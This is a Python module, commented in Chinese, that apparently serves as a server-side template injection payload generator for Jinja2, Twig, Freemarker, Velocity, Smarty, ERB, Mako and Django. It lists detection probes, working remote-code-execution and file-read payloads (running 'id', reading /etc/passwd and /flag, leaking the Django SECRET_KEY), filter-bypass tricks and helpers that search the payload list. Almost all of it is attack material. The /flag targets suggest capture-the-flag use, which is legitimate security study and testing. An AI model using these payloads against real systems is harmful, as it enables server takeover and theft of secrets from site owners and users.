# -*- coding: utf-8 -*-
"""SSTI (Server-Side Template Injection) Payload 生成器.

支持模板引擎:
    - Jinja2 / Flask
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - ERB (Ruby)
    - Mako / Tornado (Python)
    - Django (Python)
    - Jade / Pug (Node.js)
    - Handlebars (Node.js)
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  检测 Payload (Fingerprinting)
# ═══════════════════════════════════════════════════════════

DETECTION: Dict[str, List[str]] = {
    "Jinja2 (Flask)": [
        "{{7*7}}",                          # 预期: 49
        "{{'test'.upper()}}",               # 预期: TEST
        "{{config}}",                       # 预期: <Config ...>
        "{{[].__class__.__base__}}",        # 对象探测
        "{{''.__class__.__mro__}}",
        "${7*7}",                           # 替代语法
        "{{self.__init__.__globals__}}",
    ],
    "Twig (PHP/Symfony)": [
        "{{7*7}}",                          # 预期: 49
        "{{_self.env}}",                    # 环境泄露
        "{{dump(app)}}",                    # dump 函数
        "{{include('index.html')}}",        # 文件包含
        "{{'/etc/passwd'|file_excerpt(1,30)}}",
    ],
    "Freemarker (Java)": [
        "${7*7}",                           # 预期: 49
        "${product('test')}",
        "<#assign x=7*7>${x}</#assign>",    # 赋值语法
        "${.data_model.key_set()}",
        "${object.getClass()}",
    ],
    "Velocity (Java)": [
        "#set($x=7*7)$x",                   # 预期: 49
        "${class}",
        "#set($runtime = $class.forName('java.lang.Runtime'))",
    ],
    "Smarty (PHP)": [
        "{$smarty.version}",
        "{7*7}",
        "{php}echo 'test';{/php}",
        "{include file='index.php'}",
        "{system('id')}",
    ],
    "ERB (Ruby)": [
        "<%= 7*7 %>",                       # 预期: 49
        "<%= system('id') %>",
        "<%= File.read('/etc/passwd') %>",
        "<%= `ls` %>",
    ],
    "Mako (Python)": [
        "${7*7}",                           # 预期: 49
        "${self.module.cache.util.os}",
        "<% import os %>${os.popen('id').read()}",
    ],
    "Django": [
        "{{ 7*7 }}",
        "{% debug %}",
        "{{ settings.SECRET_KEY }}",
        "{% include './settings.py' %}",
    ],
}


# ═══════════════════════════════════════════════════════════
#  利用 Payload (RCE / 文件读取)
# ═══════════════════════════════════════════════════════════

EXPLOIT: Dict[str, List[Dict[str, str]]] = {
    "Jinja2 (Flask)": [
        {
            "name": "RCE - subprocess.Popen (最常用)",
            "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        },
        {
            "name": "RCE - __subclasses__ 链",
            "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}",
            "note": "X 需要替换为 subprocess.Popen 的索引, 用搜索功能查找",
        },
        {
            "name": "RCE - lipsum 方式",
            "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "RCE - request.application",
            "payload": "{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "RCE - config 方式",
            "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
        },
        {
            "name": "文件读取 - open",
            "payload": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
        },
        {
            "name": "文件读取 - lipsum",
            "payload": "{{ lipsum.__globals__.__builtins__.open('/flag').read() }}",
        },
        {
            "name": "信息泄露 - config",
            "payload": "{{ config }}",
        },
        {
            "name": "Bypass 过滤 [[]] - attr()",
            "payload": "{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}",
        },
        {
            "name": "Bypass 过滤 _ - request",
            "payload": "{{ (request|attr(request.args.attr)).__init__.__globals__.__builtins__ }}",
            "note": "需要传参 ?attr=__class__",
        },
        {
            "name": "Bypass 过滤引号 - request.args",
            "payload": "{{ lipsum.__globals__.__builtins__.open(request.args.f).read() }}",
            "note": "需要传参 ?f=/flag",
        },
        {
            "name": "Bypass 过滤 - 字符串拼接",
            "payload": "{{ ()|attr('__cla'+'ss__')|attr('__bas'+'e__') }}",
        },
        {
            "name": "Bypass 过滤 - 十六进制",
            "payload": "{{ ()['\\x5f\\x5fclass\\x5f\\x5f'] }}",
        },
    ],
    "Twig (PHP/Symfony)": [
        {
            "name": "RCE - sort filter",
            "payload": "{{ ['id', '']|sort('system') }}",
        },
        {
            "name": "RCE - filter",
            "payload": "{{ ['cat /flag']|filter('system') }}",
        },
        {
            "name": "RCE - map filter",
            "payload": "{{ ['whoami']|map('system')|join }}",
        },
        {
            "name": "文件读取 - file_excerpt",
            "payload": "{{ '/etc/passwd'|file_excerpt(1, -1) }}",
        },
        {
            "name": "信息泄露 - _self",
            "payload": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ ['id']|map('system') }}",
        },
    ],
    "Freemarker (Java)": [
        {
            "name": "RCE - Execute (经典)",
            "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag')}",
        },
        {
            "name": "RCE - ObjectConstructor",
            "payload": "${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder','cat','/flag').start()}",
        },
        {
            "name": "RCE - JythonRuntime",
            "payload": "${'freemarker.template.utility.JythonRuntime'?new()('import os;os.system(\"id\")')}",
        },
    ],
    "Velocity (Java)": [
        {
            "name": "RCE - Runtime.exec",
            "payload": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$chr.toString($out.read())#end",
        },
    ],
    "Smarty (PHP)": [
        {
            "name": "RCE - system",
            "payload": "{system('cat /flag')}",
        },
        {
            "name": "RCE - php 标签",
            "payload": "{php}system('id');{/php}",
        },
        {
            "name": "文件读取 - include",
            "payload": "{include file='/etc/passwd'}",
        },
    ],
    "ERB (Ruby)": [
        {
            "name": "RCE - system",
            "payload": "<%= system('cat /flag') %>",
        },
        {
            "name": "RCE - 反引号",
            "payload": "<%= `cat /flag` %>",
        },
        {
            "name": "文件读取 - File.read",
            "payload": "<%= File.read('/flag') %>",
        },
        {
            "name": "文件读取 - IO.readlines",
            "payload": "<%= IO.readlines('/flag') %>",
        },
    ],
    "Mako (Python)": [
        {
            "name": "RCE - os.popen",
            "payload": "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
        },
    ],
}


# ═══════════════════════════════════════════════════════════
#  Bypass / 过滤绕过分组
# ═══════════════════════════════════════════════════════════

BYPASS_FILTERS: Dict[str, List[str]] = {
    "引号过滤绕过": [
        "request.args.param          — 用 GET 参数传入字符串",
        "request.values.param        — 用 POST 参数传入字符串",
        "request.cookies.param       — 用 Cookie 传入字符串",
        "dict(__cl=dict,ass__=1)|join — 字典键拼接",
        "()|attr('\\x5f\\x5f'+'class\\x5f\\x5f') — 十六进制绕过",
    ],
    "点号过滤绕过": [
        "()|attr('__class__')        — attr() 过滤器",
        "()['__class__']             — 字典索引",
        "()|attr(request.args.a)     — 从请求参数取属性名",
    ],
    "下划线过滤绕过": [
        "request.args.param          — 从请求获取",
        "()|attr('\\x5f\\x5fclass\\x5f\\x5f') — 十六进制",
        "'_'*2~'class'~'_'*2         — 字符串拼接",
    ],
    "方括号过滤绕过": [
        "().__getitem__('class')     — __getitem__",
        "()|attr('__class__')        — attr",
        "().__class__                — 点号",
    ],
    "关键字过滤绕过": [
        "eval → lip.sum.__globals__['__builtins__']['ev'+'al']",
        "import → __builtins__['__imp'+'ort__']",
        "popen → ...os['po'+'pen']",
        "class → __dict__['__cla'+'ss__']",
    ],
}


def get_detection(engine: str = "") -> dict:
    """获取检测 Payload 列表."""
    if engine and engine in DETECTION:
        return {engine: DETECTION[engine]}
    return DETECTION


def get_exploit(engine: str = "") -> dict:
    """获取利用 Payload 列表."""
    if engine and engine in EXPLOIT:
        return {engine: EXPLOIT[engine]}
    return EXPLOIT


def get_bypass() -> dict:
    """获取绕过过滤的技巧列表."""
    return BYPASS_FILTERS


def search_payload(keyword: str) -> list:
    """在所有 Payload 中搜索关键字."""
    results = []
    for engine, payloads in EXPLOIT.items():
        for p in payloads:
            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("note", "").lower():
                results.append({"engine": engine, **p})
    return results


def subclasses_finder() -> str:
    """生成用于查找 subprocess.Popen 索引的检测 Payload."""
    return (
        "{{ ''.__class__.__mro__[1].__subclasses__() }}"
        "\n# 在输出中搜索 'subprocess.Popen', 记下它的索引 (从0开始数)"
        "\n# 然后将 X 替换为该索引:"
        "\n# {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}"
    )
